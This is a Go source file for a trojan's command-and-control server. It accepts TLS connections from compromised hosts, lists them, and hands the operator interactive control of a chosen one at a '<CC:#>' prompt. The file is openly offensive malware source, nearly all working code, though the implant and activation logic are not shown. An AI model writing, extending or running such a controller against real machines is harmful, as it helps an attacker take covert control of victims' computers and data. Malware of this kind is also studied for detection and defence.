package server

import (
	"bufio"
	"crypto/tls"
	"errors"
	"fmt"
	"log"
	"net"
	"os"
	"strconv"
	"strings"
)

// BufferSize is the amount of bytes being sent to the client
// when uploading a file
const BufferSize = 1024

// Server is
type Server struct {
	Port     int
	Target   string
	Payloads []*Payload
}

// Run runs the trojan server
func (c *Server) Run() {
	cer, err := tls.LoadX509KeyPair("server.crt", "server.key")
	if err != nil {
		log.Println(err)
		return
	}
	config := &tls.Config{Certificates: []tls.Certificate{cer}}

	addr := c.Target + ":" + strconv.Itoa(c.Port)
	listener, err := tls.Listen("tcp", addr, config)
	if err != nil {
		fmt.Printf("[ERROR] listening on %s: %v", addr, err)
		os.Exit(1)
	}

	fmt.Println("[*] listening on", addr)

	go c.acceptConnections(listener)

	// handle connections
	c.handleConnections()
}

func (c *Server) handleConnections() {
	for {
		fmt.Print("<CC:#> ")
		// Read the stdin
		stdreader := bufio.NewReader(os.Stdin)
		text, err := stdreader.ReadString('\n')
		if err != nil {
			fmt.Println("[ERROR] reading std input", err)
			continue
		}

		// Check the command issued
		switch {
		case strings.TrimSpace(text) == "show":
			for i, p := range c.Payloads {
				fmt.Printf("ID: %d Address: %s\n", i, p.Addr.String())
			}
		case strings.Contains(strings.TrimSpace(text), "use"):
			index := strings.Split(text, " ")[1]
			p, err := c.getPayload(strings.TrimSpace(index))
			if err != nil {
				fmt.Println("[ERROR] getting payload", err)
				continue
			}

			p.Activate()
		}
	}
}

func (c *Server) acceptConnections(listener net.Listener) {
	// Keep listening for connections
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("[ERROR] accepting connection", err)
			continue
		}

		// Create a new payload
		p := &Payload{
			Addr: conn.RemoteAddr(),
			Conn: conn,
		}

		// Add the payload to our Payloads slice
		c.Payloads = append(c.Payloads, p)

		fmt.Printf("[*] new connection %s. Total connections: %d\n", p.Addr, len(c.Payloads))
		fmt.Print("<CC:#> ")
	}
}

func (c *Server) getPayload(index string) (*Payload, error) {
	ii, err := strconv.Atoi(index)
	if err != nil {
		return nil, err
	}
	p := c.Payloads[ii]

	if p != nil {
		return p, nil
	}

	return nil, errors.New("payload not found")
}
